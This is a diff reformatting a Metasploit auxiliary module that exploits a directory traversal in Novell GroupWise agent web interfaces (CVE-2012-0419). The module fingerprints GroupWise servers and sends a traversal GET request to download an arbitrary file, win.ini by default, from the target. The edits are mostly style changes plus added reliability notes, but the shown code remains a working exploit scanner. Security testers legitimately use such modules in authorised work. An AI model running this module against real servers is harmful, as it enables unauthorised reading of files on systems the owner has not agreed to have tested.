@@ -9,39 +9,46 @@ class MetasploitModule < Msf::Auxiliary
   include Msf::Auxiliary::Scanner
 
   def initialize(info = {})
-    super(update_info(info,
-      'Name'           => 'Novell Groupwise Agents HTTP Directory Traversal',
-      'Description'    => %q{
+    super(
+      update_info(
+        info,
+        'Name' => 'Novell Groupwise Agents HTTP Directory Traversal',
+        'Description' => %q{
           This module exploits a directory traversal vulnerability in Novell Groupwise.
-        The vulnerability exists in the web interface of both the Post Office and the
-        MTA agents. This module has been tested successfully on Novell Groupwise 8.02 HP2
-        over Windows 2003 SP2.
-      },
-      'License'        => MSF_LICENSE,
-      'Author'         =>
-        [
+          The vulnerability exists in the web interface of both the Post Office and the
+          MTA agents. This module has been tested successfully on Novell Groupwise 8.02 HP2
+          over Windows 2003 SP2.
+        },
+        'License' => MSF_LICENSE,
+        'Author' => [
           'r () b13$', # Vulnerability discovery
           'juan vazquez' # Metasploit module
         ],
-      'References'     =>
-        [
+        'References' => [
           [ 'CVE', '2012-0419' ],
           [ 'OSVDB', '85801' ],
           [ 'BID', '55648' ],
           [ 'URL', 'https://support.microfocus.com/kb/doc.php?id=7010772' ]
-        ]
-    ))
+        ],
+        'Notes' => {
+          'Reliability' => UNKNOWN_RELIABILITY,
+          'Stability' => UNKNOWN_STABILITY,
+          'SideEffects' => UNKNOWN_SIDE_EFFECTS
+        }
+      )
+    )
 
     register_options(
       [
         Opt::RPORT(7181), # Also 7180 can be used
         OptString.new('FILEPATH', [true, 'The name of the file to download', '/windows\\win.ini']),
         OptInt.new('DEPTH', [true, 'Traversal depth if absolute is set to false', 10])
-      ])
+      ]
+    )
   end
 
   def is_groupwise?
-    res = send_request_raw({'uri'=>'/'})
+    res = send_request_raw({ 'uri' => '/' })
     if res and res.headers['Server'].to_s =~ /GroupWise/
       return true
     else
@@ -50,7 +57,6 @@ class MetasploitModule < Msf::Auxiliary
   end
 
   def run_host(ip)
-
     if not is_groupwise?
       vprint_error("#{rhost}:#{rport} - This isn't a GroupWise Agent HTTP Interface")
       return
@@ -63,8 +69,8 @@ class MetasploitModule < Msf::Auxiliary
 
     vprint_status("#{rhost}:#{rport} - Sending request...")
     res = send_request_cgi({
-      'uri'          => travs,
-      'method'       => 'GET',
+      'uri' => travs,
+      'method' => 'GET',
     })
 
     if res and res.code == 200
